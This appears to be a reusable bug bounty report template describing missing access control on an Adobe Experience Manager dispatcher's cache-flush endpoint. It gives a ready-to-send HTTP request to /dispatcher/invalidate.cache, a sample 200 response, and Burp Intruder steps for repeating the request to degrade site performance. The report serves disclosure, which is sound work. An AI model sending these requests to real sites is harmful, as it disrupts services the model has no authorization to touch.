
# Missing dispatcher filters 

Type: Improper Access Control 

## Summary

Unauthorized attackers can invalidate/flush dispatcher cache remotely. This happens because "/allowedClients" property is not defined in the dispatcher configuration of target AEM The /allowedClients property should define specific clients that are allowed to flush the cache (delete and or modify/update files) on the server.

## Affected assets 
$URL

## Steps To Reproduce

Detect the vulnerability:

Use Burp (copy and paste request)
```
GET /dispatcher/invalidate.cache HTTP/1.1
Host: $DOMAIN
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
CQ-Handle: /content
CQ-Path: /content
Accept-Encoding: gzip

TEST
```
Response

```
HTTP/1.1 200 OK
Connection: close
Content-Length: 13
Content-Type: text/html; charset=UTF-8
Date: Fri, 23 Apr 2021 21:35:28 GMT
Server: Apache
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload


<H1>OK</H1>
```

Perform the actual attack:

Just use the previous request and use Burp's Intruder to send the request multiple times (for test proposes I will test with 100) 
 
**Configuring Burp Intruder**

1. Go to tab 'positions' and choose Attack type as 'Sniper'. 
2. Add the §§ symbols to the right side of the word "TEST"
3. Go to payload tab and select Numbers as payload type
4. In the Payload Options section, write From: 1, To: 100 and Step: 1
5. Then click en **Attack.**
You will see 100 requests with 200 status responses. 


## Impact

Unauthorized attackers can invalidate/flush dispatcher cache remotely without any rate limiting. If this is done repeatedly it can severely impact the site performance.

### Supporting Material/References:
https://docs.adobe.com/content/help/en/experience-manager-dispatcher/using/configuring/dispatcher-configuration.html#limiting-the-clients-that-can-flush-the-cache
https://twitter.com/aemsecurity/status/1244965623689609217?lang=en



